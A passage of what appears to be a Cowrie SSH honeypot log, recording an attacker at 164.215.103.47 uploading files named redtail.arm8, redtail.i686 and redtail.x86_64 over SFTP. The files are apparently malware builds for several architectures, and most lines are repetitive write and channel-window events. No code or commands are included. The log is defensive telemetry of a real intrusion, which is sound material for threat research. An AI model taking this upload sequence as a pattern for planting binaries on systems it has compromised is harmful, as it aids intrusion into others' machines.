+2024-06-07T21:35:19.313189Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=22
+2024-06-07T21:35:19.623187Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:19.623422Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=23
+2024-06-07T21:35:19.933274Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=24
+2024-06-07T21:35:20.243278Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:20.243537Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=25
+2024-06-07T21:35:20.553275Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=26
+2024-06-07T21:35:20.864189Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:20.864417Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=27
+2024-06-07T21:35:21.174166Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=28
+2024-06-07T21:35:21.484189Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:21.484434Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=29
+2024-06-07T21:35:21.794327Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=30
+2024-06-07T21:35:22.104297Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:22.104532Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=31
+2024-06-07T21:35:22.414070Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=32
+2024-06-07T21:35:22.724194Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:22.725337Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=33
+2024-06-07T21:35:23.034851Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=34
+2024-06-07T21:35:23.344728Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:23.344963Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=35
+2024-06-07T21:35:23.654384Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=36
+2024-06-07T21:35:23.963742Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=37
+2024-06-07T21:35:23.963980Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP openFile: b'redtail.arm8'
+2024-06-07T21:35:24.273898Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=38
+2024-06-07T21:35:24.583677Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 89839 to 41233 in channel 0
+2024-06-07T21:35:24.583908Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=39
+2024-06-07T21:35:24.893600Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=40
+2024-06-07T21:35:25.203331Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:25.203577Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=41
+2024-06-07T21:35:25.513049Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=42
+2024-06-07T21:35:25.823410Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:25.823638Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=43
+2024-06-07T21:35:26.133271Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=44
+2024-06-07T21:35:26.443187Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:26.443415Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=45
+2024-06-07T21:35:26.753213Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=46
+2024-06-07T21:35:27.063284Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:27.063516Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=47
+2024-06-07T21:35:27.373143Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=48
+2024-06-07T21:35:27.683852Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:27.684103Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=49
+2024-06-07T21:35:27.993884Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=50
+2024-06-07T21:35:28.303629Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:28.303856Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=51
+2024-06-07T21:35:28.614435Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=52
+2024-06-07T21:35:28.924321Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:28.924562Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=53
+2024-06-07T21:35:29.234253Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=54
+2024-06-07T21:35:29.544049Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:29.544281Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=55
+2024-06-07T21:35:29.854049Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=56
+2024-06-07T21:35:30.164060Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:30.164300Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=57
+2024-06-07T21:35:30.474017Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=58
+2024-06-07T21:35:30.783887Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:30.784121Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=59
+2024-06-07T21:35:31.093706Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=60
+2024-06-07T21:35:31.403472Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:31.403726Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=61
+2024-06-07T21:35:31.713527Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=62
+2024-06-07T21:35:32.023429Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:32.023703Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=63
+2024-06-07T21:35:32.333330Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=64
+2024-06-07T21:35:32.643211Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:32.643445Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=65
+2024-06-07T21:35:32.953175Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=66
+2024-06-07T21:35:33.262895Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:33.264099Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=67
+2024-06-07T21:35:33.573749Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=68
+2024-06-07T21:35:33.883884Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:33.884132Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=69
+2024-06-07T21:35:34.193647Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=70
+2024-06-07T21:35:34.503531Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:34.503765Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=71
+2024-06-07T21:35:34.813698Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=72
+2024-06-07T21:35:35.123691Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:35.123928Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=73
+2024-06-07T21:35:35.433531Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=74
+2024-06-07T21:35:35.743458Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:35.743716Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=75
+2024-06-07T21:35:36.053420Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=76
+2024-06-07T21:35:36.363550Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:36.363787Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=77
+2024-06-07T21:35:36.673461Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=78
+2024-06-07T21:35:36.983368Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:36.983611Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=79
+2024-06-07T21:35:37.292925Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=80
+2024-06-07T21:35:37.602255Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=81
+2024-06-07T21:35:37.602507Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP openFile: b'redtail.i686'
+2024-06-07T21:35:37.912525Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=82
+2024-06-07T21:35:38.222532Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 74455 to 56617 in channel 0
+2024-06-07T21:35:38.222766Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=83
+2024-06-07T21:35:38.532295Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=84
+2024-06-07T21:35:38.843277Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:38.843512Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=85
+2024-06-07T21:35:39.153061Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=86
+2024-06-07T21:35:39.462779Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:39.463021Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=87
+2024-06-07T21:35:39.772666Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=88
+2024-06-07T21:35:40.082461Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:40.082696Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=89
+2024-06-07T21:35:40.392364Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=90
+2024-06-07T21:35:40.702528Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:40.702755Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=91
+2024-06-07T21:35:41.012419Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=92
+2024-06-07T21:35:41.322449Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:41.322675Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=93
+2024-06-07T21:35:41.632214Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=94
+2024-06-07T21:35:41.941930Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:41.942178Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=95
+2024-06-07T21:35:42.251930Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=96
+2024-06-07T21:35:42.563349Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:42.563586Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=97
+2024-06-07T21:35:42.873611Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=98
+2024-06-07T21:35:43.184051Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:43.184281Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=99
+2024-06-07T21:35:43.494168Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=100
+2024-06-07T21:35:43.804155Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:43.805363Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=101
+2024-06-07T21:35:44.115015Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=102
+2024-06-07T21:35:44.424757Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:44.424990Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=103
+2024-06-07T21:35:44.734751Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=104
+2024-06-07T21:35:45.044842Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:45.045076Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=105
+2024-06-07T21:35:45.354685Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=106
+2024-06-07T21:35:45.664918Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:45.665155Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=107
+2024-06-07T21:35:45.974921Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=108
+2024-06-07T21:35:46.284825Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:46.285063Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=109
+2024-06-07T21:35:46.594649Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=110
+2024-06-07T21:35:46.904291Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:46.904519Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=111
+2024-06-07T21:35:47.214458Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=112
+2024-06-07T21:35:47.524343Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:47.524579Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=113
+2024-06-07T21:35:47.834348Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=114
+2024-06-07T21:35:48.146317Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:48.146558Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=115
+2024-06-07T21:35:48.456229Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=116
+2024-06-07T21:35:48.766222Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:48.766498Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=117
+2024-06-07T21:35:49.076118Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=118
+2024-06-07T21:35:49.387035Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:49.387285Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=119
+2024-06-07T21:35:49.696809Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=120
+2024-06-07T21:35:50.006574Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:50.006817Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=121
+2024-06-07T21:35:50.316512Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=122
+2024-06-07T21:35:50.626373Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:50.626631Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=123
+2024-06-07T21:35:50.936262Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=124
+2024-06-07T21:35:51.246300Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:51.246531Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=125
+2024-06-07T21:35:51.556154Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=126
+2024-06-07T21:35:51.865876Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:51.866106Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=127
+2024-06-07T21:35:52.175693Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=128
+2024-06-07T21:35:52.485765Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:52.486006Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=129
+2024-06-07T21:35:52.796528Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=130
+2024-06-07T21:35:53.106224Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=131
+2024-06-07T21:35:53.415707Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=132
+2024-06-07T21:35:53.415939Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP openFile: b'redtail.x86_64'
+2024-06-07T21:35:53.725778Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 97897 to 33175 in channel 0
+2024-06-07T21:35:53.726018Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=133
+2024-06-07T21:35:54.035963Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=134
+2024-06-07T21:35:54.345773Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:54.347005Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=135
+2024-06-07T21:35:54.656717Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=136
+2024-06-07T21:35:54.966553Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:54.966788Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=137
+2024-06-07T21:35:55.276486Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=138
+2024-06-07T21:35:55.586401Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:55.586633Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=139
+2024-06-07T21:35:55.896465Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=140
+2024-06-07T21:35:56.206208Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:56.206444Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=141
+2024-06-07T21:35:56.516196Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=142
+2024-06-07T21:35:56.826094Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:56.826348Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=143
+2024-06-07T21:35:57.136245Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=144
+2024-06-07T21:35:57.446353Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:57.446589Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=145
+2024-06-07T21:35:57.756218Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=146
+2024-06-07T21:35:58.066120Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:58.066359Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=147
+2024-06-07T21:35:58.376139Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=148
+2024-06-07T21:35:58.686140Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:58.686366Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=149
+2024-06-07T21:35:58.996013Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=150
+2024-06-07T21:35:59.305826Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:59.306057Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=151
+2024-06-07T21:35:59.615709Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=152
+2024-06-07T21:35:59.926610Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:59.926848Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=153
+2024-06-07T21:36:00.236617Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=154
+2024-06-07T21:36:00.546430Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:00.546668Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=155
+2024-06-07T21:36:00.856322Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=156
+2024-06-07T21:36:01.166111Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:01.166343Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=157
+2024-06-07T21:36:01.475908Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=158
+2024-06-07T21:36:01.785765Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:01.786005Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=159
+2024-06-07T21:36:02.095975Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=160
+2024-06-07T21:36:02.405689Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:02.405919Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=161
+2024-06-07T21:36:02.715533Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=162
+2024-06-07T21:36:03.025332Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:03.025568Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=163
+2024-06-07T21:36:03.335328Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=164
+2024-06-07T21:36:03.645497Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:03.645737Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=165
+2024-06-07T21:36:03.955515Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=166
+2024-06-07T21:36:04.265462Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:04.265706Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=167
+2024-06-07T21:36:04.575605Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=168
+2024-06-07T21:36:04.885452Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:04.886823Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=169
+2024-06-07T21:36:05.196452Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=170
+2024-06-07T21:36:05.506466Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:05.506696Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=171
+2024-06-07T21:36:05.816321Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=172
+2024-06-07T21:36:06.126915Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:06.127147Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=173
+2024-06-07T21:36:06.438063Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=174
+2024-06-07T21:36:06.747912Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:06.748145Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=175
+2024-06-07T21:36:07.057875Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=176
+2024-06-07T21:36:07.367750Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:07.367979Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=177
+2024-06-07T21:36:07.678302Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=178
+2024-06-07T21:36:07.988002Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:07.988230Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=179
+2024-06-07T21:36:08.297821Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=180
+2024-06-07T21:36:08.607900Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:08.608129Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=181
+2024-06-07T21:36:08.917633Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=182
+2024-06-07T21:36:09.227458Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:36:09.227689Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=183
+2024-06-07T21:36:09.536881Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=184
